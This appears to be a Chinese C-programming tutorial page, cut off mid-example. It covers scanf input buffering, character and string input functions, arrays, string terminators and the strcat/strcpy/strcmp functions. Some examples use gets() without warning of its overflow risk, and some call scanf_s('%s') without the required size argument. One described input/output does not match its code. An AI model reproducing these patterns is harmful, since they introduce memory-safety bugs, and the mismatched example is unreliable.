<h4 id="输入与缓冲区的关系"><a href="#输入与缓冲区的关系" class="headerlink" title="输入与缓冲区的关系"></a>输入与缓冲区的关系</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    scanf_s(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>, a + b);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d   %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>, a + b);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d, %d, %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b+c=%d\n&quot;</span>, a + b + c);</span><br><span class="line"></span><br><span class="line">    scanf_s(<span class="string">&quot;%d is bigger than %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a-b=%d\n&quot;</span>, a - b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们一个一个地输入变量 a、b、c、d 的值，每输入一个值就按一次回车键。现在我们改变输入方式，将四个变量的值一次性输入，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12 60 10 23↙</span><br><span class="line">a+b=72</span><br><span class="line">c*d=230</span><br></pre></td></tr></table></figure>

<p>可以发现，两个 scanf() 都能正确读取。合情合理的猜测是，第一个 scanf() 读取完毕后没有抛弃多余的值，而是将它们保存在了某个地方，下次接着使用。</p>
<blockquote>
<p><strong>从本质上讲，我们从键盘输入的数据并没有直接交给 scanf()，而是放入了缓冲区中，直到我们按下回车键，scanf() 才到缓冲区中读取数据。如果缓冲区中的数据符合 scanf() 的要求，那么就读取结束；如果不符合要求，那么就继续等待用户输入，或者干脆读取失败。</strong></p>
</blockquote>
<h4 id="输入字符和字符串所有函数汇总"><a href="#输入字符和字符串所有函数汇总" class="headerlink" title="输入字符和字符串所有函数汇总"></a>输入字符和字符串所有函数汇总</h4><h4 id="输入单个字符"><a href="#输入单个字符" class="headerlink" title="输入单个字符"></a><strong>输入单个字符</strong></h4><h5 id="getchar"><a href="#getchar" class="headerlink" title="getchar()"></a>getchar()</h5><p>最容易理解的字符输入函数是 getchar()，它就是<code>scanf(&quot;%c&quot;, c)</code>的替代品，除了更加简洁，没有其它优势了；或者说，getchar() 就是 scanf() 的一个简化版本。</p>
<h5 id="getche-：windows特有函数"><a href="#getche-：windows特有函数" class="headerlink" title="getche()：windows特有函数"></a>getche()：windows特有函数</h5><p>getche() 就比较有意思了，它没有缓冲区，输入一个字符后会立即读取，不用等待用户按下回车键，这是它和 scanf()、getchar() 的最大区别。请看下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = getche();</span><br><span class="line">    printf(&quot;c: %c\n&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="getche-：Windows特有函数"><a href="#getche-：Windows特有函数" class="headerlink" title="getche()：Windows特有函数"></a>getche()：Windows特有函数</h5><p>getch() 也没有缓冲区，输入一个字符后会立即读取，不用按下回车键，这一点和 getche() 相同。getch() 的特别之处是它没有回显，看不到输入的字符。所谓回显，就是在控制台上显示出用户输入的字符；没有回显，就不会显示用户输入的字符，就好像根本没有输入一样。回显在大部分情况下是有必要的，它能够与用户及时交互，让用户清楚地看到自己输入的内容。但在某些特殊情况下，我们却不希望有回显，例如输入密码，有回显是非常危险的，容易被偷窥。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><img src="/image/image-20240126171440826.png" alt="image-20240126171440826" style="zoom:80%;" />

<h4 id="输入字符串"><a href="#输入字符串" class="headerlink" title="输入字符串"></a>输入字符串</h4><h5 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h5><p>输入字符串当然可以使用 scanf() 这个通用的输入函数，对应的格式控制符为<code>%s</code>，上节已经讲到了；本节我们重点讲解的是 gets() 这个专用的字符串输入函数，它拥有一个 scanf() 不具备的特性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> author[<span class="number">30</span>], lang[<span class="number">30</span>], url[<span class="number">30</span>];</span><br><span class="line">    gets(author);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;author: %s\n&quot;</span>, author);</span><br><span class="line">    gets(lang);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lang: %s\n&quot;</span>, lang);</span><br><span class="line">    gets(url);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;url: %s\n&quot;</span>, url);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets() 是有缓冲区的，每次按下回车键，就代表当前输入结束了，gets() 开始从缓冲区中读取内容，这一点和 scanf() 是一样的。gets() 和 scanf() 的主要区别是：</p>
<ul>
<li>scanf() 读取字符串时以<strong>空格为分隔</strong>，遇到空格就认为当前字符串结束了，所以无法读取含有空格的字符串。</li>
<li>gets() 认为<strong>空格也是字符串的一部分</strong>，只有遇到回车键时才认为字符串输入结束，所以，不管输入了多少个空格，只要不按下回车键，对 gets() 来说就是一个完整的字符串。</li>
</ul>
<p>也就是说，gets() 能读取含有空格的字符串，而 scanf() 不能。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组的内存结构"><a href="#数组的内存结构" class="headerlink" title="数组的内存结构"></a>数组的内存结构</h3><p>数组是一个整体，它的内存是连续的；也就是说，数组元素之间是相互挨着的，彼此之间没有一点点缝隙。下图演示了<code>int a[4];</code>在内存中的存储情形：</p>
<img src="/image/101402I50-0.png" alt="img" style="zoom:80%;" />

<p>「数组内存是连续的」这一点很重要，所以我使用了一个大标题来强调。连续的内存为<a href="https://c.biancheng.net/c/80/">指针</a>操作（通过指针来访问数组元素）和内存处理（整块内存的复制、写入等）提供了便利，这使得数组可以作为缓存（临时存储数据的一块内存）使用。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ol>
<li>可以只给部分元素赋值。当<code>&#123; &#125;</code>中值的个数少于元素个数时，只给前面部分元素赋值。例如：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=&#123;<span class="number">12</span>, <span class="number">19</span>, <span class="number">22</span> , <span class="number">993</span>, <span class="number">344</span>&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>只能给元素逐个赋值，不能给数组整体赋值。例如给 10 个元素全部赋值为 1，只能写作：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>如给全部元素赋值，那么在定义数组时可以不给出数组长度。例如：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>如果只初始化部分数组元素，那么剩余的数组元素也会自动初始化为“零”值，所以我们只需要将 str 的第 0 个元素赋值为 0，剩下的元素就都是 0 了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="判断数组中是否包含某个元素"><a href="#判断数组中是否包含某个元素" class="headerlink" title="判断数组中是否包含某个元素"></a>判断数组中是否包含某个元素</h3><p>在实际开发中，经常需要查询数组中的元素。例如，学校为每位同学分配了一个唯一的编号，现在有一个数组，保存了实验班所有同学的编号信息，如果有家长想知道他的孩子是否进入了实验班，只要提供孩子的编号就可以，如果编号和数组中的某个元素相等，就进入了实验班，否则就没进入。</p>
<p>不幸的是，C语言标准库没有提供与数组查询相关的函数，所以我们只能自己编写代码。</p>
<h4 id="无序数组查询"><a href="#无序数组查询" class="headerlink" title="无序数组查询"></a>无序数组查询</h4><p>所谓无序数组，就是数组元素的排列没有规律。无序数组元素查询的思路也很简单，就是用循环遍历数组中的每个元素，把要查询的值挨个比较一遍。请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">296</span>, <span class="number">177</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">34</span>, <span class="number">999</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, num, thisindex = <span class="number">-1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input an integer: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == num)&#123;</span><br><span class="line">            thisindex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(thisindex &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d isn&#x27;t  in the array.\n&quot;</span>, num);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is  in the array, it&#x27;s index is %d.\n&quot;</span>, num, thisindex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20240126172627339.png" alt="image-20240126172627339" style="zoom: 67%;" />

<h4 id="有序数组查询"><a href="#有序数组查询" class="headerlink" title="有序数组查询"></a>有序数组查询</h4><p>查询无序数组需要遍历数组中的所有元素，而查询有序数组只需要遍历其中一部分元素。例如有一个长度为 10 的整型数组，它所包含的元素按照从小到大的顺序（升序）排列，假设比较到第 4 个元素时发现它的值大于输入的数字，那么剩下的 5 个元素就没必要再比较了，肯定也大于输入的数字，这样就减少了循环的次数，提高了执行效率。</p>
<p>请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">34</span>, <span class="number">100</span>, <span class="number">177</span>, <span class="number">296</span>, <span class="number">999</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, num, thisindex = <span class="number">-1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input an integer: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == num)&#123;</span><br><span class="line">            thisindex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i] &gt; num)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(thisindex &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d isn&#x27;t  in the array.\n&quot;</span>, num);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is  in the array, it&#x27;s index is %d.\n&quot;</span>, num, thisindex);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符数组和字符串详解"><a href="#字符数组和字符串详解" class="headerlink" title="字符数组和字符串详解"></a>字符数组和字符串详解</h3><p>用来存放字符的数组称为<strong>字符数组</strong>，例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">10</span>];  <span class="comment">//一维字符数组</span></span><br><span class="line"><span class="type">char</span> b[<span class="number">5</span>][<span class="number">10</span>];  <span class="comment">//二维字符数组</span></span><br><span class="line"><span class="type">char</span> c[<span class="number">20</span>]=&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;m&#x27;</span>&#125;;  <span class="comment">// 给部分数组元素赋值</span></span><br><span class="line"><span class="type">char</span> d[]=&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span> &#125;;  <span class="comment">//对全体元素赋值时可以省去长度</span></span><br></pre></td></tr></table></figure>

<p>字符数组实际上是一系列字符的集合，也就是<strong>字符串（String）</strong>。在C语言中，没有专门的字符串变量，没有string类型，通常就用一个字符数组来存放一个字符串。</p>
<p>C语言规定，可以将字符串直接赋值给字符数组，例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">30</span>] = &#123;<span class="string">&quot;c.biancheng.net&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> str[<span class="number">30</span>] = <span class="string">&quot;c.biancheng.net&quot;</span>;  <span class="comment">//这种形式更加简洁，实际开发中常用</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h3><p>在C语言中，字符串总是以<code>&#39;\0&#39;</code>作为结尾，所以<code>&#39;\0&#39;</code>也被称为字符串结束标志，或者字符串结束符。</p>
<blockquote>
<p><code>&#39;\0&#39;</code>是 ASCII 码表中的第 0 个字符，英文称为 NUL，中文称为“空字符”。该字符既不能显示，也没有控制功能，输出该字符不会有任何效果，它在C语言中唯一的作用就是作为字符串结束标志。</p>
</blockquote>
<p>由<code>&quot; &quot;</code>包围的字符串会自动在末尾添加<code>&#39;\0&#39;</code>。例如，<code>&quot;abc123&quot;</code>从表面看起来只包含了 6 个字符，其实不然，C语言会在最后隐式地添加一个<code>&#39;\0&#39;</code>，这个过程是在后台默默地进行的，所以我们感受不到。</p>
<p>下图演示了<code>&quot;C program&quot;</code>在内存中的存储情形：</p>
<p><img src="/image/103521G44-0.png" alt="img"></p>
<p>需要注意的是，逐个字符地给数组赋值并不会自动添加<code>&#39;\0&#39;</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[] = &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;;</span><br></pre></td></tr></table></figure>

<p>数组 str 的长度为 3，而不是 4，因为最后没有<code>&#39;\0&#39;</code>。</p>
<img src="/image/image-20240131173936688.png" alt="image-20240131173936688" style="zoom: 67%;" />

<p>当用字符数组存储字符串时，要特别注意<code>&#39;\0&#39;</code>，要为<code>&#39;\0&#39;</code>留个位置；这意味着，字符数组的长度至少要比字符串的长度大 1。请看下面的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[7] = &quot;abc123&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;abc123&quot;</code>看起来只包含了 6 个字符，我们却将 str 的长度定义为 7，就是为了能够容纳最后的<code>&#39;\0&#39;</code>。如果将 str 的长度定义为 6，它就无法容纳<code>&#39;\0&#39;</code>了。</p>
<blockquote>
<p>当字符串长度大于数组长度时，有些较老或者不严格的编译器并不会报错，甚至连警告都没有，这就为以后的错误埋下了伏笔，读者自己要多多注意。</p>
</blockquote>
<p>有些时候，程序的逻辑要求我们必须逐个字符地为数组赋值，这个时候就很容易遗忘字符串结束标志<code>&#39;\0&#39;</code>。下面的代码中，我们将 26 个大写英文字符存入字符数组，并以字符串的形式输出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">30</span>];</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(c=<span class="number">65</span>,i=<span class="number">0</span>; c&lt;=<span class="number">90</span>; c++,i++)&#123;</span><br><span class="line">        str[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 VS2015 下的运行结果：</p>
<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ口口口口i口口0 ?</p>
<p><code>口</code>表示无法显示的特殊字符。</p>
<blockquote>
<p>在函数内部定义的变量、数组、结构体、共用体等都称为局部数据。在很多编译器下，局部数据的初始值都是随机的、无意义的，而不是我们通常认为的“零”值。这一点非常重要，大家一定要谨记，否则后面会遇到很多奇葩的错误。</p>
</blockquote>
<blockquote>
<p>本例中的 str 数组在定义完成以后并没有立即初始化，所以它所包含的元素的值都是随机的，只有很小的概率会是“零”值。循环结束以后，str 的前 26 个元素被赋值了，剩下的 4 个元素的值依然是随机的，不知道是什么。</p>
</blockquote>
<h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><p>所谓字符串长度，就是字符串包含了多少个字符（不包括最后的结束符<code>&#39;\0&#39;</code>）。例如<code>&quot;abc&quot;</code>的长度是 3，而不是 4。</p>
<p>在C语言中，我们使用<code>string.h</code>头文件中的 strlen() 函数来求字符串的长度，它的用法为：</p>
<p>length strlen(strname);</p>
<p>strname 是字符串的名字，或者字符数组的名字；length 是使用 strlen() 后得到的字符串长度，是一个整数。</p>
<img src="/image/image-20240131174909524.png" alt="image-20240131174909524" style="zoom:67%;" />

<h3 id="字符串输入输出"><a href="#字符串输入输出" class="headerlink" title="字符串输入输出"></a>字符串输入输出</h3><p><strong>输入</strong></p>
<p>在C语言中，有两个函数可以让用户从键盘上输入字符串，它们分别是：</p>
<ul>
<li>scanf()：通过格式控制符<code>%s</code>输入字符串。除了字符串，scanf() 还能输入其他类型的数据。</li>
<li>gets()：直接输入字符串，并且只能输入字符串。</li>
</ul>
<p>但是，scanf() 和 gets() 是有区别的：</p>
<ul>
<li>scanf() 读取字符串时以空格为分隔，遇到空格就认为当前字符串结束了，所以无法读取含有空格的字符串。</li>
<li>gets() 认为空格也是字符串的一部分，只有遇到回车键时才认为字符串输入结束，所以，不管输入了多少个空格，只要不按下回车键，对 gets() 来说就是一个完整的字符串。换句话说，gets() 用来读取一整行字符串。</li>
</ul>
<p><strong>例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str2[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str3[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//gets() 用法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a string: &quot;</span>);</span><br><span class="line">    gets(str1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//scanf() 用法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a string: &quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%s&quot;</span>, str2);</span><br><span class="line">    scanf_s(<span class="string">&quot;%s&quot;</span>, str3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nstr1: %s\n&quot;</span>, str1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str2: %s\n&quot;</span>, str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str3: %s\n&quot;</span>, str3);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input a string: C C++ Java Python↙</span><br><span class="line">Input a string: PHP JavaScript↙</span><br><span class="line"></span><br><span class="line">str1: C C++ Java Python</span><br><span class="line">str2: PHP</span><br><span class="line">str3: JavaScript</span><br></pre></td></tr></table></figure>

<p>第一次输入的字符串被 gets() 全部读取，并存入 str1 中。第二次输入的字符串，前半部分被第一个 scanf() 读取并存入 str2 中，后半部分被第二个 scanf() 读取并存入 str3 中。</p>
<blockquote>
<p>注意，scanf() 在读取数据时需要的是数据的地址，这一点是恒定不变的，所以对于 int、char、float 等类型的变量都要在前边添加<code>&amp;</code>以获取它们的地址。但是在本段代码中，我们只给出了字符串的名字，却没有在前边添加<code>&amp;</code>，这是为什么呢？因为<strong>字符串名字或者数组名字在使用的过程中一般都会转换为地址</strong>，所以再添加<code>&amp;</code>就是多此一举，甚至会导致错误了。</p>
<p>就目前学到的知识而言，int、char、float 等类型的变量用于 scanf() 时都要在前面添加<code>&amp;</code>，而数组或者字符串用于 scanf() 时不用添加<code>&amp;</code>，它们本身就会转换为地址。读者一定要谨记这一点。</p>
</blockquote>
<h4 id="其实-scanf-也可以读取带空格的字符串"><a href="#其实-scanf-也可以读取带空格的字符串" class="headerlink" title="其实 scanf() 也可以读取带空格的字符串"></a>其实 scanf() 也可以读取带空格的字符串</h4><p>以上是 scanf() 和 gets() 的一般用法，很多教材也是这样讲解的，所以大部分初学者都认为 scanf() 不能读取包含空格的字符串，不能替代 gets()。其实不然，scanf() 的用法还可以更加复杂和灵活，它不但可以完全替代 gets() 读取一整行字符串，而且比 gets() 的功能更加强大。比如，以下功能都是 gets() 不具备的：</p>
<ul>
<li>scanf() 可以控制读取字符的数目；</li>
<li>scanf() 可以只读取指定的字符；</li>
<li>scanf() 可以不读取某些字符；</li>
<li>scanf() 可以把读取到的字符丢弃。</li>
</ul>
<h3 id="C语言字符串处理函数"><a href="#C语言字符串处理函数" class="headerlink" title="C语言字符串处理函数"></a>C语言字符串处理函数</h3><h4 id="字符串连接函数-strcat"><a href="#字符串连接函数-strcat" class="headerlink" title="字符串连接函数 strcat()"></a>字符串连接函数 strcat()</h4><p>strcat 是 string catenate 的缩写，意思是把两个字符串拼接在一起，语法格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strcat(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>arrayName1、arrayName2 为需要拼接的字符串。</p>
<blockquote>
<p>strcat() 将把 arrayName2 连接到 arrayName1 后面，并删除原来 arrayName1 最后的结束标志<code>&#39;\0&#39;</code>。这意味着，arrayName1 必须足够长，要能够同时容纳 arrayName1 和 arrayName2，否则会越界（超出范围）。</p>
</blockquote>
<p><strong>strcat() 的返回值为 arrayName1 的地址。</strong></p>
<h4 id="字符串复制函数-strcpy"><a href="#字符串复制函数-strcpy" class="headerlink" title="字符串复制函数 strcpy()"></a>字符串复制函数 strcpy()</h4><p>strcpy 是 string copy 的缩写，意思是字符串复制，也即将字符串从一个地方复制到另外一个地方，语法格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strcpy(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>strcpy() 会把 arrayName2 中的字符串拷贝到 arrayName1 中，字符串结束标志<code>&#39;\0&#39;</code>也一同拷贝。请看下面的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">50</span>] = <span class="string">&quot;《C语言变怪兽》&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str2[<span class="number">50</span>] = <span class="string">&quot;http://c.biancheng.net/cpp/u/jiaocheng/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(str1, str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str1: %s\n&quot;</span>, str1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br>str1: <a href="http://c.biancheng.net/cpp/u/jiaocheng/">http://c.biancheng.net/cpp/u/jiaocheng/</a></p>
<p>你看，将 str2 复制到 str1 后，str1 中原来的内容就被覆盖了。</p>
<p>另外，strcpy() 要求 arrayName1 要有足够的长度，否则不能全部装入所拷贝的字符串。</p>
<h4 id="字符串比较函数-strcmp"><a href="#字符串比较函数-strcmp" class="headerlink" title="字符串比较函数 strcmp()"></a>字符串比较函数 strcmp()</h4><p>strcmp 是 string compare 的缩写，意思是字符串比较，语法格式为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(arrayName1, arrayName2);</span><br></pre></td></tr></table></figure>

<p>arrayName1 和 arrayName2 是需要比较的两个字符串。</p>
<p>字符本身没有大小之分，strcmp() 以各个字符对应的 ASCII 码值进行比较。strcmp() 从两个字符串的第 0 个字符开始比较，如果它们相等，就继续比较下一个字符，直到遇见不同的字符，或者到字符串的末尾。</p>
<p>返回值：若 arrayName1 和 arrayName2 相同，则返回0；若 arrayName1 大于 arrayName2，则返回大于 0 的值；若 arrayName1 小于 arrayName2，则返回小于0 的值。</p>
<p>对4组字符串进行比较：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[] = <span class="string">&quot;aBcDeF&quot;</span>;</span><br><span class="line">    <span class="type">char</span> b[] = <span class="string">&quot;AbCdEf&quot;</span>;</span><br><span class="line">    <span class="type">char</span> c[] = <span class="string">&quot;aacdef&quot;</span>;</span><br><span class="line">    <span class="type">char</span> d[] = <span class="string">&quot;aBcDeF&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS b: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, b));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS c: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, c));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a VS d: %d\n&quot;</span>, <span class="built_in">strcmp</span>(a, 